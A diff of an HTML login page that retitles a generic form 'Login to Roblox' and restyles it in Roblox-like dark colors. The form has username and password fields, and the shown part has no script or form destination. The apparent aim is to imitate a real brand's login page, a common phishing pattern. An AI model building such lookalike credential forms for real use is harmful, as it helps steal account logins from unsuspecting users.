@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Page</title>
+    <title>Login to Roblox</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -11,10 +11,10 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background-color: #343433;
+            background-color: #232527; /* Background color set to #232527 */
         }
         .container {
-            background-color: gray;
+            background-color: #393b3d; /* Container color set to #393b3d */
             padding: 20px;
             border-radius: 5px;
             width: 500px;
@@ -40,20 +40,23 @@
             width: 80%;
             padding: 10px;
             margin-bottom: 10px;
-            border: 1px solid white; /* Border set to white */
+            border: 1px solid white;
             border-radius: 4px;
-            background-color: gray; /* Background color set to gray */
-            color: white; /* Text color set to white */
+            background-color: #393b3d; /* Button color set to #393b3d */
+            color: white;
             cursor: pointer;
         }
         button:hover {
-            background-color: #505050; /* Slightly darker gray for hover effect */
+            background-color: #505050;
+        }
+        h2 {
+            color: white; /* Title color set to white */
         }
     </style>
 </head>
 <body>
     <div class="container login-container">
-        <h2>Login</h2>
+        <h2>Login to Roblox</h2> <!-- Title changed to "Login to Roblox" -->
         <form id="loginForm">
             <input type="text" id="username" name="username" placeholder="Username" required>
             <input type="password" id="password" name="password" placeholder="Password" required>
